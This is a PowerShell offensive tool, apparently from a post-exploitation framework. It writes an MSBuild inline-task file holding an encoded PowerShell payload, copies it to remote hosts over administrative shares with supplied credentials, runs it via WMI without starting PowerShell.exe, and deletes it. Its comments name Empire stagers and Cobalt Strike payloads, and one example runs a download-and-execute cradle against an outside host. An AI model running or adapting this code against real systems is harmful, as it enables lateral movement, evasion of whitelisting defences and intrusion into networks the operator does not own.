function Invoke-ExecuteMSBuild
{
    <#
    .SYNOPSIS
    Executes a powershell command on a local/remote host by utilizing MSBuild.

    Author: Christopher Ross (@xorrior)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION
    This function executes a powershell command on a local/remote host using MSBuild and an inline task. If credentials are provided, the default administrative share is mounted locally.
    The xml file is copied to the specified path through the share. If credentials are not provided for a remote host, the xml file is copied using the default administrative share. If the Command 
    parameter is omitted, the embedded powershell command will be used. This command will be executed in the context of the MSBuild.exe process without starting PowerShell.exe. 

    .PARAMETER ComputerName
    The IP address or host name to target. If omitted, all commands will be executed on localhost. 

    .PARAMETER UserName
    UserName to utilize for all Wmi commands on the remote host. 

    .PARAMETER Password
    Password to utilize for all Wmi commands on the remote host. 

    .PARAMETER FilePath
    The desired location to copy the xml file on the target. 

    .PARAMETER DriveLetter
    The drive letter to use when mounting the share locally.

    .PARAMETER Command
    The PowerShell command to execute on the target. 

    .EXAMPLE
    Invoke-ExecuteMSBuild -ComputerName 'testvm.test.org' -UserName 'Test.org\Joe' -Password 'Password123!'

    Execute the embedded powershell command on the specified hostname, with the specified credentials 

    .EXAMPLE 
    Invoke-ExecuteMSBuild -ComputerName 'testvm.test.org' -Command "IEX (New-Object net.webclient).DownloadString('http://www.getyourpowershellhere.com/payload')"

    Execute the specified powershell command on testvm.test.org in the current user context

    .EXAMPLE 
    Invoke-ExecuteMSBuild 

    Execute the embedded powershell command on localhost 

    .OUTPUTS
    ManagementBaseObject
    #>

    [CmdletBinding()]
    param
    (
        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [string]$ComputerName,

        [Parameter(ParameterSetName = "Credentials")]
        [ValidateNotNullOrEmpty()]
        [string]$UserName,

        [Parameter(ParameterSetName = "Credentials")]
        [ValidateNotNullOrEmpty()]
        [string]$Password,

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [string]$FilePath = "C:\Windows\Tasks\pshell.xml",

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [ValidatePattern("[a-zA-Z]:")]
        [string]$DriveLetter = "T:",

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [string]$Command
    )

    $commonArgs = @{}
    $WmiArgs = @{}

    function Invoke-ExecuteMSBuildHelper {
        Write-Verbose "[+]Executing MSBuild with xml...." 
        $WmiArgs = @{
            Namespace = 'root/CIMV2'
            Class = 'Win32_Process'
            Name = 'Create'
        }

        $cmd = "cmd.exe /c $MSBuildPath $FilePath"

        $WmiArgs['ArgumentList'] = $cmd
                    
        $result = Invoke-WmiMethod @WmiArgs @commonArgs 
        if ($result.ReturnValue -ne 0) {
            Write-Verbose "Unable to execute $cmd with error code: $($result.ReturnValue)"
        }
        $result
    }

    $InlineTask = @"
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes c# code. -->
  <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe pshell.xml -->
  <!-- Author: Casey Smith, Twitter: @subTee -->
  <!-- License: BSD 3-Clause -->
  <Target Name="Hello">
   <FragmentExample />
   <ClassExample />
  </Target>
  <UsingTask
    TaskName="FragmentExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <ParameterGroup/>
    <Task>
      <Using Namespace="System" />
    <Using Namespace="System.IO" />
      <Code Type="Fragment" Language="cs">
        <![CDATA[
          Console.WriteLine("Hello From Fragment");
        ]]>
      </Code>
    </Task>
  </UsingTask>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task>
    <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[
    
      using System;
      using System.IO;
      using System.Diagnostics;
      using System.Reflection;
      using System.Runtime.InteropServices;

      //Add For PowerShell Invocation
      using System.Collections.ObjectModel;
      using System.Management.Automation;
      using System.Management.Automation.Runspaces;
      using System.Text;


      using Microsoft.Build.Framework;
      using Microsoft.Build.Utilities;
              
      public class ClassExample :  Task, ITask
      {
        public override bool Execute()
        {
              string encCommand = "ENCCOMMAND";
                    Runspace runspace = RunspaceFactory.CreateRunspace();
                    runspace.Open();
                    RunspaceInvoke rInvoker = new RunspaceInvoke(runspace);
                    Pipeline pipeline = runspace.CreatePipeline();
                    //Decode the base64 encoded command
                    byte[] data = Convert.FromBase64String(encCommand);
                    string command = Encoding.ASCII.GetString(data);

                    pipeline.Commands.AddScript(command);
                    pipeline.Invoke();
                    runspace.Close();
          
              return true;
          }

            }
 
      
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>

"@

    #When omitting the Command paramter, place your embedded command here. Ideal for Empire stagers, Cobalt Strike PowerShell payloads, etc.
    $embeddedCommand = @"
LAUNCHER
"@


    #If the Username and Password are specified, add the ComputerName and PSCredential object to commonArgs for later use. 
    if (($PSBoundParameters['ComputerName'])) { 
        $commonArgs['ComputerName'] = $ComputerName 
        if ($PSCmdlet.ParameterSetName -eq "Credentials") {
            $MountShare = $True
            $SecurePassword = $Password | ConvertTo-SecureString -AsPlainText -Force
            $Credential =  New-Object System.Management.Automation.PSCredential($UserName, $SecurePassword)
            $commonArgs['Credential'] = $Credential
        }
    }

    if ( -not $PSBoundParameters['Command']) {
        Write-Verbose "[+]Command parameter not used, using embedded command...."
        $Command = $embeddedCommand
    }

    #Encode our payload to store in the xml file
    Write-Verbose "[+]Crafting the xml file....."
    $enc = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($Command))
    $InlineTask = $InlineTask.Replace('ENCCOMMAND',$enc)

    #Get the msbuild path
    #HKLM
    Write-Verbose "[+]Enumerating the MSBuildTools path...."
    $HiveVal = [UInt32]2147483650
    $sSubKeyName = 'SOFTWARE\Microsoft\MSBuild\ToolsVersions\4.0'
    $WmiArgs = @{
        Namespace = 'root/DEFAULT'
        Class = 'StdRegProv'
        Name = 'EnumKey'
        ArgumentList = $HiveVal, $sSubKeyName
    }

    if ((Invoke-WmiMethod @WmiArgs @commonArgs).ReturnValue -eq 0) {
        $sValueName = 'MSBuildToolsPath'
        $WmiArgs['Name'] = 'GetStringValue'
        $WmiArgs['ArgumentList'] = $HiveVal,$sSubKeyName,$sValueName

        $result = Invoke-WmiMethod @WmiArgs @commonArgs
        if ($result.ReturnValue -ne 0) {
            Write-Error "Unable to obtain MSBuild location from the registry"
            break
        }

        $MSBuildPath = "$($result.sValue)MSBuild.exe"
    }
    else {
        Write-Error "Unable to enumerate MSBuildTools registry key"
        break
    }

    #Get the default drive of the target system. If it does not match the drive in FilePath, correct it. 
    $WmiArgs = @{
        Namespace = 'root/CIMV2'
        Class = 'Win32_OperatingSystem'
    }
    Write-Verbose "[+]Enumerating the default system drive......"
    $SystemDirectory = (Get-WmiObject @WmiArgs @commonArgs).SystemDirectory
    $DefaultDrive = $SystemDirectory.Split('\')[0]
    if ($DefaultDrive -ne $($FilePath.Split('\')[0])) {
        $FilePath = "$DefaultDrive$($FilePath.Split(':')[1])"
    }

    if ($MountShare) {
        #Mount the Default Administrative share locally
        $Network = New-Object -ComObject Wscript.Network
        try {
            $sharePath = "\\$ComputerName\$($DefaultDrive.Replace(':','$'))"
            $Network.MapNetworkDrive($DriveLetter,$sharePath,$false,$Credential.GetNetworkCredential().UserName,$Credential.GetNetworkCredential().Password)
            $InlineTask | Out-File -FilePath "$DriveLetter$($FilePath.Split(':')[1])" -Encoding ascii
        }
        catch [System.Exception] {
            #if we can't map the new share locally, remove it and exit 
            Write-Error $_ 
            $null = $Network.RemoveNetworkDrive($DriveLetter,$True,$True)
            break
        }

        Invoke-ExecuteMSBuildHelper

        #Cleanup our xml file and remove the share.
        Start-Sleep -Seconds 10
        Remove-Item "$DriveLetter\$($FilePath.Split(':')[1])"
        $Network.RemoveNetworkDrive($DriveLetter,$True,$True)
    }
    elseif ($commonArgs['ComputerName']) {
        #When omitting credentials when specifying a ComputerName, it's assumed that the current user context has administrative privileges on the target. 
        #Therefore we can just write the file on the target using the C$ administrative share.
        Write-Verbose "[+]UserName and Password parameters were not used. Copying the xml file using the C$ Default Share on $ComputerName"
        $RemotePath = "\\$ComputerName\$($FilePath.Replace(':','$'))"

        try {
            $InlineTask | Out-File -Encoding ascii $RemotePath
        }
        catch [System.Exception] {
            Write-Error $_ 
            break
        }

        Invoke-ExecuteMSBuildHelper
        #Cleanup our xml file.
        Start-Sleep -Seconds 10
        Remove-Item $RemotePath
    }
    else {
        #Write our XML file locally
        Write-Verbose "[+]Writing the file locally to $FilePath"
        try {
            $InlineTask | Out-File -Encoding ascii $FilePath
        }
        catch [System.Exception] {
            Write-Error $_ 
            break
        }

        Invoke-ExecuteMSBuildHelper
        Start-Sleep -Seconds 10
        Remove-Item $FilePath -Force
    }

}